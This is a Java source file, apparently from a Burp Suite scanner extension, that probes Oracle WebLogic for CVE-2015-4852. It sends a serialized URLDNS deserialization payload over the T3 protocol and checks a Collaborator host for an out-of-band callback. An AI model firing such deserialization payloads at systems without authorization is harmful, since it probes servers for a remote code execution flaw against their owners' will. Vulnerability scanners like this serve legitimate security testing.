package probes;

import burp.*;
import payloads.URLDNS;

import java.net.Socket;

public class CVE_2015_4852 extends Probe {
    private static final String NAME = "CVE-2015-4852";
    private static final String SEVERITY = "High";
    private static final String DESC = "The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product.";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        IHttpService service = requestResponse.getHttpService();
        String pollPayload = Utilities.collaborator.generatePayload(true);

        try {
            Socket s = new Socket(service.getHost(), service.getPort());
            s.setSoTimeout(10);
            sendT3Payload(s, URLDNS.getPayloadBytes("http://" + pollPayload));
            s.close();
        } catch (Exception e) {
            e.printStackTrace(Utilities.err);
        }

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    requestResponse,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }

}
